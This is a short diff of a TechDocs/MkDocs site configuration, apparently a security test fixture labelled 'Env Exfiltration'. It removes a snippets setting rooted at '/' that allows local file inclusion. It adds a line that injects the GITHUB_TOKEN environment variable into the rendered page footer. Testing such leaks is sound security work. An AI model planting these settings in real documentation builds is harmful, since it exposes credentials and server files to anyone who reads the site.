@@ -1,8 +1,5 @@
-site_name: LFI-Exploit-Exfiltration
+site_name: Env Exfiltration
+copyright: !env_var GITHUB_TOKEN 
 plugins:
   - techdocs-core
-markdown_extensions:
-  - pymdownx.snippets:
-      base_path: /
-
 
